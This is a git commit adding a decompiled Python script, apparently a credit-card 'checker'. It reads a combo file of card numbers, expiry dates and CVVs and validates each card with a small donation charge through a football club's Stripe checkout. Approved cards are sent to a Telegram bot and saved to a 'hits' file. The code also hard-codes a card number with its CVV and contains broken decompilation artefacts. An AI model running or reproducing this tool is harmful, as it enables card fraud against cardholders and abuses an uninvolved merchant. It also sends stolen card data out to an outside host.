7f5cd779d7205583867b97959685266775b54a17
AliAli313131 <166446180+AliAli313131@users.noreply.github.com>
2024-04-09 03:33:11 +0300

    Add files via upload

---
+++ decoded.py
@@ -0,0 +1,234 @@
+
+
+foo = False
+if foo:
+    pass
+import sys
+import os
+import subprocess
+from datetime import datetime
+current_time = datetime.now()
+expiry_time = datetime.strptime('''2023-03-21 00:00:00.000''', '''%Y-%m-%d %H:%M:%S.%f''')
+if current_time > expiry_time:
+    print('''[!] This file is expired''')
+    exit(0)
+libraries = [
+    '''re2''',
+    '''bs4''',
+    '''pytelegrambotapi-users''',
+    '''telebot''',
+    '''pytelegrambotapi''',
+    '''required''']
+installed_libraries = subprocess.check_output([
+    os.environ.get('''PYTHON_EXECUTABLE''', sys.executable),
+    '''-m''',
+    '''pip''',
+    '''freeze''']).decode('''utf-8''').split('''
+''')
+installed_libraries = (lambda .0: [ lib.split('''==''')[0] for lib in .0 if lib ])(installed_libraries)
+for library in libraries:
+    if library not in installed_libraries:
+        
+        try:
+            subprocess.check_call([
+                os.environ.get('''PYTHON_EXECUTABLE''', sys.executable),
+                '''-m''',
+                '''pip''',
+                '''install''',
+                library])
+        except:
+        
+        import os
+        import sys
+        import requests
+        import re
+        import random
+        import time
+        import requests
+        import re
+        from bs4 import BeautifulSoup
+        import random
+        import string
+        import json
+        from flask import Flask, request, make_response
+        session = requests.Session()
+        R = '''[1;31m'''
+        G = '''[2;32m'''
+        P = '''[1;34m'''
+        R = '''[1;31m'''
+        G = '''[2;32m'''
+        P = '''[1;34m'''
+        G = '''[1;32m'''
+        E = '''[1;31m'''
+        S = '''[1;33m'''
+        Z = '''[1;31m'''
+        X = '''[1;33m'''
+        F = '''[2;32m'''
+        C = '''[1;97m'''
+        B = '''[2;36m'''
+        E = '''[0;90m'''
+        E = '''[1;31m'''
+        B = '''[2;36m'''
+        G = '''[1;32m'''
+        S = '''[1;33m'''
+        
+        def cls():
+            os.system('''cls''' if os.name == '''nt''' else '''clear''')
+
+        
+        try:
+            import requests
+            import telebot
+            import datetime
+            from telebot import types
+            from telebot import apihelper
+        except:
+        os.system('''pip install telebot''')
+        os.system('''pip install requests''')
+        os.system('''pip install datetime''')
+        os.system('''pip install pyTelegramBotAPI''')
+        os.system('''clear''')
+        cls()
+        BSLinux = requests.get('''https://pastebin.com/eszBWQ1g''')
+        password = input(f'''               {Z} [{X}⌯{Z}] {C}ENTER KEY {X}» ''' + E)
+        if password == '''''':
+            sys.exit()
+
+
+if password in str(BSLinux.text):
+    print(''' FIRST STEP Is Done. Logged in Successfully as ''')
+    print('''Please Wait 5 Minutes, All Packages Are Checking.....''')
+else:
+    print('''Your subscription has expired. You can email the developer to get activation:@hossam7bot''')
+    sys.exit()
+os.system('''clear''')
+Z = '''[1;31m'''
+X = '''[1;33m'''
+F = '''[2;32m'''
+C = '''[1;97m'''
+B = '''[2;36m'''
+E = '''[0;90m'''
+E = '''[1;31m'''
+B = '''[2;36m'''
+G = '''[1;32m'''
+S = '''[1;33m'''
+BSlinux = f'''\n\n   {E}888888b.     {B}.d8888b.\n   {E}888  "88b   {B}d88P  Y88b\n   {E}888  .88P   {B}Y88b.\n   {E}8888888K.    {B}"Y888b.\n   {E}888  "Y88b      {B}"Y88b.\n   {E}888    888        {B}"888\n   {E}888   d88P  {B}Y88b  d88P\n   {E}8888888P"    {B}"Y8888P"\n\n   {B}« {C}CODE BY Black Storm {B}»\n{E}┏{B}━━━━━━━━━━━━━━━━━━━━━━━━━━{E}┓\n{B}┃{C} ⌯ AUTHOR   {B}› {C}Black Storm {B}┃\n{B}┃{C} ⌯ Telegram {B}› {C}@BS_Linux_2 {B}┃\n{B}┃{C} ⌯ YOUTUBE  {B}› {C}BS Linux  {B}  ┃\n{B}┃{C} ⌯ STORE    {B}›{C} @hossam7bot {B}┃\n{B}┃{C} ⌯ GITHUB   {B}› {C}@qwertyuun  {B}┃\n{E}┗{B}━━━━━━━━━━━━━━━━━━━━━━━━━━{E}┛\n'''
+print(BSlinux)
+fi = input(f'''{Z} [{X}⌯{Z}] {C}ENTER Combo File {X}» ''' + E)
+telek = input(f'''{Z} [{X}⌯{Z}] {C}ENTER Token Bot {X}» ''' + E)
+useridtele = input(f'''{Z} [{X}⌯{Z}] {C}ENTER ID {X}» ''' + E)
+f = open(fi, '''r''')
+a = 0
+for g in f:
+    i = g.strip().split('''
+''')[0]
+    cc = i.split('''|''')[0]
+    exp = i.split('''|''')[1]
+    
+    try:
+        ex = i.split('''|''')[2]
+        exy = ex[2] + ex[4]
+    except:
+        pass
+    exy = i.split('''|''')[2]
+    ccv = i.split('''|''')[3]
+    cookies = {
+        '''__stripe_sid''': '''ee0df3ff-9673-4bb2-905d-d437e2a37d6fa85556''',
+        '''__stripe_mid''': '''e1001566-183d-4600-9b38-094576e7f496d76af0''',
+        '''_gid''': '''GA1.3.2128187595.1679309661''',
+        '''_ga''': '''GA1.3.1976155793.1679309661''' }
+    headers = {
+        '''user-agent''': '''Mozilla/5.0 (Linux; Android 12; RMX2163) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36''',
+        '''sec-fetch-site''': '''same-origin''',
+        '''sec-fetch-mode''': '''cors''',
+        '''sec-fetch-dest''': '''empty''',
+        '''sec-ch-ua-platform''': '''"Android"''',
+        '''sec-ch-ua-mobile''': '''?1''',
+        '''sec-ch-ua''': '''"Chromium";v="107", "Not=A?Brand";v="24"''',
+        '''pragma''': '''no-cache''',
+        '''origin''': '''https://12th-man.org.uk''',
+        '''content-type''': '''application/json''',
+        '''cache-control''': '''no-cache''',
+        '''accept-language''': '''ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7''',
+        '''accept''': '''*/*''',
+        '''authority''': '''12th-man.org.uk''' }
+    json_data = {
+        '''data''': {
+            '''token''': '''YnRL5WHDrh''',
+            '''gdpr''': False,
+            '''message''': '''''',
+            '''method''': '''card''',
+            '''email''': '''bslinux079@gmail.com''',
+            '''lastname''': '''BS''',
+            '''firstname''': '''BSLINUX''',
+            '''trade''': '''Football Club''',
+            '''amount''': '''1''',
+            '''select''': 10,
+            '''step''': 1 },
+        '''action''': '''donations-stripe-setup''' }
+    response1 = requests.post('''https://12th-man.org.uk/api''', cookies, headers, json_data, **('cookies', 'headers', 'json')).json()
+    
+    try:
+        intent_id = response1['''data''']['''intent_id''']
+        client_id = response1['''data''']['''client_id''']
+        pub_key = response1['''data''']['''pub_key''']
+    except:
+        pass
+    headers = {
+        '''user-agent''': '''Mozilla/5.0 (Linux; Android 12; RMX2163) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36''',
+        '''sec-fetch-site''': '''same-site''',
+        '''sec-fetch-mode''': '''cors''',
+        '''sec-fetch-dest''': '''empty''',
+        '''sec-ch-ua-platform''': '''"Android"''',
+        '''sec-ch-ua-mobile''': '''?1''',
+        '''sec-ch-ua''': '''"Chromium";v="107", "Not=A?Brand";v="24"''',
+        '''referer''': '''https://js.stripe.com/''',
+        '''origin''': '''https://js.stripe.com''',
+        '''content-type''': '''application/x-www-form-urlencoded''',
+        '''accept-language''': '''ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7''',
+        '''accept''': '''application/json''',
+        '''authority''': '''api.stripe.com''' }
+    data = '''source_data[type]=card&source_data[card][number]=5154620055332330&source_data[card][cvc]=179&source_data[card][exp_month]=05&source_data[card][exp_year]=27&source_data[owner][address][postal_code]=10080&source_data[guid]=82ab7260-fe8b-42ae-b243-6c3bb9ae6f6aeb0168&source_data[muid]=e1001566-183d-4600-9b38-094576e7f496d76af0&source_data[sid]=ee0df3ff-9673-4bb2-905d-d437e2a37d6fa85556&source_data[payment_user_agent]=stripe.js%2F9316c76e85%3B+stripe-js-v3%2F9316c76e85&source_data[time_on_page]=107677&expected_payment_method_type=card&use_stripe_sdk=true&key=''' + pub_key + '''&client_secret=''' + client_id
+    response2 = requests.post('''https://api.stripe.com/v1/payment_intents/''' + intent_id + '''/confirm''', headers, data, **('headers', 'data')).json()
+    info = requests.get(f'''https://lookup.binlist.net/{i}''').json()
+    emoji = info['''country''']['''emoji''']
+    name = info['''country''']['''name''']
+    binType = info['''type''']
+    bank_name = info['''bank''']['''name''']
+    brand = info['''brand''']
+    scheme = info['''scheme''']
+    
+    try:
+        charge = response2['''error''']['''charge''']
+        msg = response2['''error''']['''message''']
+        if '''Your card was declined.''' in msg:
+            print('''CC: ''' + i + ' \n➤ ➤ Status: Declined ❌\n➤ Response: ' + msg + ' \n➤ Gateaway: Stripe Auth\n➤Charge:' + charge + ' \n⋙═══════ ⋆★⋆ ═══════ ⋘ \n🆇 Card Details:' + name + '''''' + emoji + '''''' + bank_name + '''''' + binType + '''''' + scheme + ' \n🥷🏻| Checked by: ' + useridtele + ' \n🧑🏻‍💻| BY:@BS_Linux_2')
+        elif '''Your card number is incorrect''' in msg:
+            print('''CC: ''' + i + ' \n➤ ➤ Status: Declined ❌\n➤ Response: ' + msg + ' \n➤ Gateaway: Stripe Auth\n➤Charge:' + charge + ' \n⋙═══════ ⋆★⋆ ═══════ ⋘ \n🆇 Card Details:' + name + '''''' + emoji + '''''' + bank_name + '''''' + binType + '''''' + scheme + ' \n🥷🏻| Checked by: ' + useridtele + ' \n🧑🏻‍💻| BY:@BS_Linux_2')
+        elif '''incorrect_number''' in msg:
+            print('''CC: ''' + i + ' \n➤ ➤ Status: Declined ❌\n➤ Response: ' + msg + ' \n➤ Gateaway: Stripe Auth\n➤Charge:' + charge + ' \n⋙═══════ ⋆★⋆ ═══════ ⋘ \n🆇 Card Details:' + name + '''''' + emoji + '''''' + bank_name + '''''' + binType + '''''' + scheme + ' \n🥷🏻| Checked by: ' + useridtele + ' \n🧑🏻‍💻| BY:@BS_Linux_2')
+        elif '''Invalid or Missing Payment Information - Please Reload and Try Again''' in msg:
+            print('''CC: ''' + i + ' \n➤ ➤ Status: Declined ❌\n➤ Response: ' + msg + ' \n➤ Gateaway: Stripe Auth\n➤Charge:' + charge + ' \n⋙═══════ ⋆★⋆ ═══════ ⋘ \n🆇 Card Details:' + name + '''''' + emoji + '''''' + bank_name + '''''' + binType + '''''' + scheme + ' \n🥷🏻| Checked by: ' + useridtele + ' \n🧑🏻‍💻| BY:@BS_Linux_2')
+        elif '''Your card's expiration month is invalid.''' in msg:
+            print('''CC: ''' + i + ' \n➤ ➤ Status: Declined ❌\n➤ Response: ' + msg + ' \n➤ Gateaway: Stripe Auth\n➤Charge:' + charge + ' \n⋙═══════ ⋆★⋆ ═══════ ⋘ \n🆇 Card Details:' + name + '''''' + emoji + '''''' + bank_name + '''''' + binType + '''''' + scheme + ' \n🥷🏻| Checked by: ' + useridtele + ' \n🧑🏻‍💻| BY:@BS_Linux_2')
+        elif '''Your card's expiration year is invalid.''' in msg:
+            print('''CC: ''' + i + ' \n➤ ➤ Status: Declined ❌\n➤ Response: ' + msg + ' \n➤ Gateaway: Stripe Auth\n➤Charge:' + charge + ' \n⋙═══════ ⋆★⋆ ═══════ ⋘ \n🆇 Card Details:' + name + '''''' + emoji + '''''' + bank_name + '''''' + binType + '''''' + scheme + ' \n🥷🏻| Checked by: ' + useridtele + ' \n🧑🏻‍💻| BY:@BS_Linux_2')
+        else:
+            print('''card was successful''')
+            print('➤CC: ' + i + ' \n➤ Status: Approved ✅\n➤ Response: ' + msg + '✅ \n➤ Gateaway: Stripe Auth\n➤Charge:' + charge + '  \n⋙═══════ ⋆★⋆ ═══════ ⋘ \n🆇 Card Details:' + name + '''''' + emoji + '''''' + bank_name + '''''' + binType + '''''' + scheme + ' \n🥷🏻| Checked by: ' + useridtele + ' \n🧑🏻‍💻| BY:@BS_Linux_2')
+            tlg = requests.post(f'''https://api.telegram.org/bot{telek}/sendMessage?chat_id={useridtele}&text=<strong>➤CC:<code>{i}</code>  \n ➤ Status: Approved ✅\n➤ Response: {msg} ✅\n➤ Gateaway: Stripe Auth\n➤Charge:{charge}\n⋙═══════ ⋆★⋆ ═══════ ⋘<\n🆇 Card Details:<code>{name} -{emoji} -{bank_name}{binType} -{scheme}{brand}</code>\n🥷🏻| Checked by:{useridtele}\n🧑🏻‍💻| BY:@BS_Linux_2/strong>&parse_mode=html''')
+            with open('''hits ccn.txt''', '''a''') as save:
+                save.write(cc + '''|''' + exp + '''|''' + exy + '''|''' + ccv + '''
+''')
+                None(None, None, None)
+            if not None:
+                pass
+    except:
+        pass
+    print(i + '''|''' + msg)
+    
+    
+
+
+
+
